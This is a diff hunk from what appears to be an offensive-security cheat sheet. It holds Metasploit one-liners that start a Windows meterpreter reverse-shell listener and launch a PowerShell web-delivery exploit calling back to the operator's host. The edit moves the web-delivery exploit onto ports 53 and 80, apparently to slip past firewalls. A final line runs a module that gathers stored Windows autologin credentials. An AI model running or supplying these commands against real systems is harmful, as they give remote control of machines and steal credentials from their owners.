@@ -1806,7 +1806,7 @@ services.msc
 rlwrap msfconsole -q -x "use multi/handler; setg PAYLOAD windows/x64/meterpreter/reverse_tcp; setg LHOST $MYIP; setg LPORT 4444; run"
 
 -->> Web Delivery
-msfconsole -q -x 'use exploit/multi/script/web_delivery; setg SESSION 1; setg LHOST $MYIP; setg LPORT 8787; set TARGET PSH; setg PAYLOAD windows/x64/meterpreter/reverse_tcp; run'
+msfconsole -q -x 'use exploit/multi/script/web_delivery; setg SESSION 1; setg SRVPORT 53; setg LHOST $MYIP; setg LPORT 80; set TARGET PSH; setg PAYLOAD windows/x64/meterpreter/reverse_tcp; run'
 
 +---------- Stored Credentials ----------+
 run post/windows/gather/credentials/windows_autologin
